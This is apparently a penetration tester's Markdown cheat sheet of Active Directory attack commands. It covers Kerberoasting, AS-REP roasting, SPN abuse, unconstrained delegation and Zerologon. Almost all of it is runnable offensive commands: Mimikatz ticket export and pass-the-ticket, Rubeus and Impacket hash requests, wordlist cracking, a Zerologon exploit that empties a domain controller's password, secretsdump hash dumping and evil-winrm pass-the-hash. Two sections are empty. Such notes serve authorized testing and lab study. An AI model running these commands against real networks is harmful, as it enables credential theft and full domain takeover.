## Kerberoasting
> - only for accounts that have SPNs
> - SPN accounts can use services and use silver ticket 
```
# Get SPN 
Get-NetUser -SPN (powerview)
ldapsearch -h 10.10.10.100 -x -b "DC={domain},DC={domain}" | grep -i serviceprincipalname

# Get SPN AD module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Request a TGS
Add-type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{ServicePrincipalName}"

# Export the SPN hash
Invoke-Mimikatz -Command '"kerberos::list /export"'
GetUserSPNs.py -request -dc-ip {ip} {domain}/{service name}

# Bruteforce
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt {ticket}.kirbi
```
## Asrep roast
> - for users who have kerberos preauth disabled
```
# Powerview_dev:
Get-DomainUser -PreauthNOtRequired -Verbose

# ActiveDirectory Module:
Get-ADUser -Filter {DoesNOtRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

# AS-rep dump
. .\ASREPRoast.ps1
Get-ASREPHash -UserName {username} -Verbose

# using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast


# no access
GetNPUsers.py -request -dc-ip 10.10.10.100 {domain}/
GetNPUsers.py -request -dc-ip 10.10.10.100 {domain}/{useraccount}
```
## SetSPN
> - for accounts that have generic write/all over a user
> - sets a SPN over an account 
```
# find users with ACL rights
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "{USERS}"}

# PowerView_Dev:
Get-DomainUser -Identity {username} | select serviceprincipalname

# AD module
Get-ADUser -Identity {username} -Properties ServicePrincipalName | select ServicePrincipalName

# set SPN
Set-DomainObject -Identity {username} -Set @{serviceprincipalname='dcorp/something'}

Set-ADuser -Identity {username} -ServicePrincipalNames @{Add='dcorp/something'}

# Request for TGS
Add-type -AssemblyName System.IdentityModel 
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "{ServicePrincipalName}"

# Export the SPN hash
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Bruteforce
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt {ticket}.kirbi
```
## Constrained/Unconstrained Delegation
### Unconstrained
> - allow a server to request any computer/service in the domain
> - DC will always have unconstrained delegation
> - requires local admin
```
# Discover Computers with unconstarined delegation via powerview
Get-NetComputer -UnConstrained

# Find Domain Admin tickets
Invoke-mimikatz -command '"sekurlsa::tickets"'
klist

# Export ticket
Invoke-mimikatz -command '"sekurlsa::tickets /export"'

# PTH
Invoke-mimikatz -command '"kerberos::ptt {filepath}.kirbi"'
```
### Constrained delegation
```

```
## Zerologon
```
# Download the file
git clone https://github.com/risksense/zerologon.git
python3 set_empty_pw.py DC 10.10.10.100

# Hashdump
secretsdump.py -hashes:31d6cfe0d16ae931b73c59d7e0c089c0 '{DOMAIN}/{COMPUTER}$@{IP}'

# PTH
evil-winrm -i 10.10.10.100 -u {username} -H "{HASH}"
```

## Trust Abuse
```

```